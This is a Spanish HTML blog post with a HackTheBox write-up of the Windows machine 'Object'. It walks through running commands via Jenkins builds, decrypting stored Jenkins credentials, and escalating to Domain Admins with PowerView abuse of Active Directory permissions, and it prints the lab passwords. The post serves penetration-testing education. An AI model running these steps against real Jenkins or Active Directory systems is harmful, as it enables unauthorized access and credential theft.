@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Object - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Maquina Object - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Oject de hackthebox una maquina windows de dificultad dificil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del jenkins para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con bloodhound, abusaremos del permiso de ForceChangedPassword para cambiar la contraseña de un usuario y una vez como este aprovecharnos de GenericWrite para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio WriteOwner asigarnos el privilegio de DomainAdmins y asi obtener acceso completo al sistema. Maquina bastante interesante." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Oject de hackthebox una maquina windows de dificultad dificil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del jenkins para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con bloodhound, abusaremos del permiso de ForceChangedPassword para cambiar la contraseña de un usuario y una vez como este aprovecharnos de GenericWrite para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio WriteOwner asigarnos el privilegio de DomainAdmins y asi obtener acceso completo al sistema. Maquina bastante interesante." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Object" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Object" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Object/object.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-26T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Object/object.png" />
+<meta property="twitter:title" content="Maquina Object - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-10-26T00:00:00-05:00","datePublished":"2023-10-26T00:00:00-05:00","description":"El dia de hoy vamos a resolver Oject de hackthebox una maquina windows de dificultad dificil, esta vez nos enfrentamos a un jenkyll el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del jenkins para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con bloodhound, abusaremos del permiso de ForceChangedPassword para cambiar la contraseña de un usuario y una vez como este aprovecharnos de GenericWrite para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio WriteOwner asigarnos el privilegio de DomainAdmins y asi obtener acceso completo al sistema. Maquina bastante interesante.","headline":"Maquina Object - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Object/object.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Object"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Object"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Object - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-10-26">26 Oct 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Object/object.png" alt="Maquina Object - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Oject</code> de <code>hackthebox</code> una maquina <code>windows</code> de dificultad <code>dificil</code>, esta vez nos enfrentamos a un <code>jenkyll</code> el cual vamos a explotarlo de dos maneras, la primera a traves de la ejecución de una tarea ejecutada periodicamente y la otra a traves del empleo de un token, despues enumeraremos las reglas de firewall para verificar las restricciones y aprochecharemos el acceso a los archivos del <code>jenkins</code> para desencriptar una contraseña que nos permitira conectarnos al sistema. Ya estando dentro luego de realizar una enumeración con <code>bloodhound</code>, abusaremos del permiso de <code>ForceChangedPassword</code> para cambiar la contraseña de un usuario y una vez como este aprovecharnos de <code>GenericWrite</code> para retocar los atributos de otro usuario manipulando el comportamiento de acción a traves del inicio de sesión y migrar a otro usuario para finalmente con el privilegio <code>WriteOwner</code> asigarnos el privilegio de <code>DomainAdmins</code> y asi obtener acceso completo al sistema.</p>
+
+<p>Maquina bastante interesante.</p>
+
+<p>Comenzamos como es de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Object
+❯ ls
+
+ Object
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.11.132
+PING 10.10.11.132 (10.10.11.132) 56(84) bytes of data.
+64 bytes from 10.10.11.132: icmp_seq=1 ttl=127 time=143 ms
+
+--- 10.10.11.132 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 143.382/143.382/143.382/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>127</code> y por proximidad seria correspondiente a una maquina <code>windows</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.132 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 17:58 -05
+Initiating SYN Stealth Scan at 17:58
+Scanning 10.10.11.132 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.132
+Discovered open port 8080/tcp on 10.10.11.132
+Discovered open port 5985/tcp on 10.10.11.132
+Completed SYN Stealth Scan at 17:58, 26.99s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.132
+Host is up, received user-set (0.20s latency).
+Scanned at 2023-10-26 17:58:21 -05 for 27s
+Not shown: 65532 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE    REASON
+80/tcp   open  http       syn-ack ttl 127
+5985/tcp open  wsman      syn-ack ttl 127
+8080/tcp open  http-proxy syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 27.10 seconds
+           Raw packets sent: 131085 (5.768MB) | Rcvd: 22 (968B)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p80,5985,8080 10.10.11.132 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-26 18:00 -05
+Nmap scan report for 10.10.11.132
+Host is up (0.25s latency).
+
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Mega Engines
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+8080/tcp open  http    Jetty 9.4.43.v20210629
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+|_http-server-header: Jetty(9.4.43.v20210629)
+| http-robots.txt: 1 disallowed entry 
+|_/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.27 seconds
+</code></pre>
+
+<p>Entre los puertos abiertos mas relevantes podemos visualizar:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Microsoft IIS httpd 10.0</td>
+    </tr>
+    <tr>
+      <td>8080</td>
+      <td>HTTP</td>
+      <td>Jetty 9.4.43.v20210629</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>HTTP</td>
+      <td>WINRM</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotacion">EXPLOTACION <a href="#explotacion">#</a></h2>
+
+<p>Como vemos que los puertos <code>80</code> y <code>8080</code> corresponde a un servicio web con <code>whatweb</code> vamos a tratar de enumerar las tecnolologias que emplean.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.11.132
+http://10.10.11.132 [200 OK] Country[RESERVED][ZZ], Email[ideas@object.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.132], JQuery[2.1.3], Microsoft-IIS[10.0], Modernizr, Script, Title[Mega Engines]
+❯ whatweb http://10.10.11.132:8080
+http://10.10.11.132:8080 [403 Forbidden] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
+http://10.10.11.132:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.c4a63e7b], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.43.v20210629)], HttpOnly[JSESSIONID.c4a63e7b], IP[10.10.11.132], Jenkins[2.317], Jetty[9.4.43.v20210629], PasswordField[j_password], Script[text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
+</code></pre>
+
+<p>Vemos que nos enfrentamos a un <code>IIS</code> y en el puerto <code>8080</code> a un <code>jenkyll</code>, asi que vamos a proceder a abrirnos el servicio en nuestro navegador.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje1.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje2.PNG" alt="" /></p>
+
+<p>Vemos la opcion de crear cuenta, asi vamos a proceder a registrarnos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje3.PNG" alt="" /></p>
+
+<p>Una vez creamos nuestra cuenta, nos redirigimos a un panel de usuario.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje4.PNG" alt="" /></p>
+
+<p>Dentro podemos crear un proyecto al cual llamare <code>test</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje5.PNG" alt="" /></p>
+
+<p>Tendremos una serie de opciones como agregar un nombre.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje6.PNG" alt="" /></p>
+
+<p>Y en la parte de <code>build triggers</code>, seleccionar que se ejecute periodicamente y configurar la ejecución cada minuto como si fuera una tarea cron.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje7.PNG" alt="" /></p>
+
+<p>Despues en <code>build</code> seleccionar ejecutar comando de windows.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje8.PNG" alt="" /></p>
+
+<p>Aqui agregaremos el comando que deseamos ejecutar, Aplicamos los cambios y guardamos.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje9.PNG" alt="" /></p>
+
+<p>Pasado un minuto vemos en nuestro <code>build history</code> vemos dos compilaciones.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje10.PNG" alt="" /></p>
+
+<p>Seleccionamos cualquiera y en <code>console output</code> vemos que se ejecuto el comando correctamente.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje11.PNG" alt="" /></p>
+
+<p>Otra forma mas comoda en la que podemos ejecutar comandos es a traves de la creación de un token, esto podemos hacerlo en la configuración de nuestro perfil.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje12.PNG" alt="" /></p>
+
+<p>Ahora en la configuración de nuestro proyecto debemos indicarle esta vez en lanzar ejecuciones remotas y ahora a esa <code>url</code> generada debemos de tramitarle una petición con la autenticacion requerida, donde debemos indicarle nuestro usuario y el token.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje13.PNG" alt="" /></p>
+
+<p>Esta vez trataremos de ejecutar otro comando para listar el directorio actual.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje14.PNG" alt="" /></p>
+
+<p>Lanzamos la petición con <code>curl</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://fmiracle:1120abc86ec7661ac09d63349eb055baff@10.10.11.132:8080/job/test/build?token=myToken"
+</code></pre>
+<p>Recargamos la pagina y vemos que se genero otro build.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje15.PNG" alt="" /></p>
+
+<p>Seleccionamos el nuevo build y vemos que el codigo se ejecuto correctamente.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje16.PNG" alt="" /></p>
+
+<p>Ahora podriamos tratar de ganar acceso al sistema a traves de una conexión por <code>tcp o udp</code> a nuestra maquina, pero si hacemos el mismo proceso y ejecutamos esta sentencia en <code>powershell</code> podemos ver mediante las reglas de firewall que unicamente tenemos permitido el <code>icmp</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje17.PNG" alt="" /></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje18.PNG" alt="" /></p>
+
+<p>Vimos anteriormente que listando el directorio existia uno llamado <code>.jenkys</code>, asi que vamos a listar los recursos dentro de este, esto lo logramos ejecutando los mismos pasos anteriores.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje19.PNG" alt="" /></p>
+
+<p>Vemos los directorios <code>users</code> y <code>secrets</code> y si lo listamos vemos los usuarios existentes.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje20.PNG" alt="" /></p>
+
+<p>Si listamos ahora lo que hay en <code>admin</code>, encontramos un archivo <code>config.xml</code>, que si lo leemos vemos la contraseña del usuario encryptada.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje21.PNG" alt="" /></p>
+
+<p>Esta contraseña podemos tratar de desencriptarla, pero para ello vamos a necesitar los archivos del directorio <code>secrets</code> los archivos <code>master.key</code> y <code>hudson.util.secret</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje22.PNG" alt="" /></p>
+
+<p>Primero vamos a copiarnos el <code>master.key</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje23.PNG" alt="" /></p>
+
+<p>No olvidemos que hay quitar el salto de linea para que no de problemas.</p>
+
+<pre><code class="language-bash">❯ cat master.key| tr -d '\n' | sponge master.key
+</code></pre>
+
+<p>Ahora nos copiaremos el <code>hudson</code> pero debido a que este no es legible primero lo vamos a convertir a <code>base64</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/obje24.PNG" alt="" /></p>
+
+<p>Una vez que tenemos los 3 archivos.</p>
+
+<pre><code class="language-bash">❯ ls
+ config.xml   hudson.util.Secret   master.key
+</code></pre>
+
+<p>Vamos a utilizar la herramienta del repositorio de <code>hoto</code>:</p>
+
+<ul>
+  <li><a href="https://github.com/hoto/jenkins-credentials-decryptor">jenkins-credentials-decryptor</a></li>
+</ul>
+
+<p>Solo debes ejecutar este comando para tenerla.</p>
+
+<pre><code class="language-bash">curl -L \
+  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
+   -o jenkins-credentials-decryptor
+
+chmod +x jenkins-credentials-decryptor
+</code></pre>
+
+<p>Ejecutamos con los parametros correspondientes, indicando cada archivo y obtenemos la contraseña en texto claro.</p>
+
+<pre><code class="language-bash">❯ ./jenkins-credentials-decryptor -c config.xml -m master.key -s hudson.util.Secret
+[
+  {
+    "id": "320a60b9-1e5c-4399-8afe-44466c9cde9e",
+    "password": "c1cdfun_d2434\u0003\u0003\u0003",
+    "username": "oliver"
+  }
+]
+</code></pre>
+
+<p>Ahora que el servicio de <code>winrm</code> esta activo, podemos conectarnos usando estas credenciales al equipo y obtenemos la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\oliver\Documents&gt; whoami
+object\oliver
+</code></pre>
+<p><img src="/assets/images/HTB/htb-writeup-Object/rt.PNG" alt="" /></p>
+
+<h2 id="elevacion-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#elevacion-de-privilegios">#</a></h2>
+
+<p>Vamos a utilizar <code>sharphound</code> para enumerar el sistema y visualizar los resultados en <code>bloodhound</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1">SharpHound.ps1</a></li>
+</ul>
+
+<p>Subimos el <code>sharphound</code> al equipo importandolo directamente con <code>Iex</code>.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; upload /home/fmiracle/machines/Oject/content/SharpHound.ps1
+                                        
+Info: Uploading /home/fmiracle/machines/Oject/content/SharpHound.ps1 to C:\Windows\Temp\Privesc\SharpHound.ps1
+                                        
+Data: 1297764 bytes of 1297764 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Import-Module .\SharpHound.ps1
+</code></pre>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob1.PNG" alt="" /></p>
+
+<p>Nos transferimos el comprimido y lo abrimos en <code>bloodhound</code>.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; download C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip
+                                        
+Info: Downloading C:\Windows\Temp\Privesc\20231026165356_BloodHound.zip to 20231026165356_BloodHound.zip
+                                        
+Info: Download successful!
+</code></pre>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob2.PNG" alt="" /></p>
+
+<p>Observamos que el usuario <code>oliver</code> tenemos el permiso de <code>ForceChangedPassword</code> sobre <code>smith</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob3.PNG" alt="" /></p>
+
+<p>Si vamos a la opción <code>abuse info</code>, vemos una manera de poder aprovecharnos de este privilegio, para ello primero debemos generar una contraseña en formato <code>SecureString</code> y ejecutar <code>Set-DomainUserPassword</code> que es una función de <code>Powerview.ps1</code> asi que primero debemos descargarnos el script e importarnos el modulo.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob4.PNG" alt="" /></p>
+
+<ul>
+  <li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView.ps1</a></li>
+</ul>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+*Evil-WinRM* PS C:\Windows\Temp\Privesc&gt; Set-DomainUserPassword -Identity smith -AccountPassword $secPassword
+</code></pre>
+
+<p>Validamos y nos conectamos exitosamente como <code>smith</code> con la credencial que definimos.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password123!'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+</code></pre>
+
+<p>Ahora que somo <code>smith</code> vamos a marcarlo como <code>Owned</code> y veamos con que permisos cuenta este nuevo usuario.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob5.PNG" alt="" /></p>
+
+<p>Vemos que este nuevo usuario tiene el privilegio de <code>GenericWrite</code> sobre <code>maria</code>, y si vamos a <code>abuse info</code> nos dice que podemos tratar de ejecutar un <code>kerberoasting attack</code>, pero si lo tratamos de realizar no podremos crackear la contraseña debido a que la contraseña del usuario <code>maria</code> es bastante robusta.</p>
+
+<p>Pero dado que con este privilegio podemos modificar los atributos de un usuario, vamos a tratar de aprovecharnos de este privilegio asignando un script de inicio de sesión al perfil de maria, de este modo cada vez que inicie sesión puedo hacer que ejecute un script que podemos definirnos.</p>
+
+<p>Pero para ello debemos de usar la función <code>Set-DomainObject</code> que se encuentra en <code>PowerView.ps1</code>, asi que vamos a volver a importarlo.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Import-Module .\PowerView.ps1
+</code></pre>
+<p>Despues vamos a crear un script <code>test.ps1</code> que copie todos los archivos del escritorio de <code>maria</code> a mi ruta actual.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\ProgramData\Privesc&gt; echo "copy C:\Users\Maria\Desktop\* C:\ProgramData\Privesc\" &gt; test.ps1
+*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\Privesc\test.ps1'}
+</code></pre>
+
+<p>Listamos los archivos y vemos un archivo <code>Engine.xsl</code> que vamos a traernos a nuestro equipo.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob6.PNG" alt="" /></p>
+
+<p>Abrimos el archivo con <code>libreoffice</code>.</p>
+
+<pre><code class="language-bash">❯ ls
+ 20231026165356_BloodHound.zip   config.xml   credentials.txt   Engines.xls   hudson.util.Secret   jenkins-credentials-decryptor   master.key   PowerView.ps1   SharpHound.ps1
+❯ libreoffice Engines.xls
+</code></pre>
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob7.PNG" alt="" /></p>
+
+<p>Probamos las contraseña y obtenemos nuevas credenciales validas, <code>maria:W3llcr4ft3d_4cls</code>, nos conectamos y ahora somos el usuario <code>maria</code>.</p>
+
+<pre><code class="language-bash">❯ evil-winrm -i 10.10.11.132 -u 'maria' -p 'W3llcr4ft3d_4cls'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maria\Documents&gt; whoami
+object\maria
+</code></pre>
+<p>Ahora como maria vemos que tenemos el privilegio de <code>WriteOwner</code> sobre <code>Domain Admins</code> y ya con esto podriamos asignarnos el grupo <code>Domain Admins</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob8.PNG" alt="" /></p>
+
+<p>Si vemos el <code>abuse info</code> nuevamente podemos ver que nos indica una forma en la que podemos hacerlo, para ello vamos a ejecutar lo siguiente, pero no sin antes volver a importar el <code>PowerView.ps1</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Object/ob9.PNG" alt="" /></p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity maria
+*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All -PrincipalIdentity maria
+</code></pre>
+
+<p>Vemos los grupos del usuario <code>maria</code> y ya se encuentra en <code>Domain Admins</code>.</p>
+
+<pre><code class="language-cmd">*Evil-WinRM* PS C:\ProgramData\Privesc&gt; net user maria
+User name                    maria
+Full Name                    maria garcia
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/21/2021 9:16:32 PM
